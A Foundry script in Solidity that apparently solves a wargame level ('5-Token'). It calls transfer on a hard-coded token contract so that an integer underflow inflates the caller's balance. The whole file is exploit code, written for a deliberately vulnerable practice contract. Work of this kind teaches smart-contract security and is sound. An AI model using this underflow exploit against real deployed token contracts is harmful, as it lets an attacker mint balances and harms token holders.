// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "../levels/5-Token.sol";
import "forge-std/Script.sol";

contract Attack is Script {
    Token token = Token(0xdf7555814cA271b31DdEC7E3b9be9720e6413442);

    function run() external{
        vm.startBroadcast();

        // Explot underflow to increase balance
        token.transfer(0x478f3476358Eb166Cb7adE4666d04fbdDB56C407, 21);

        vm.stopBroadcast();
    }
}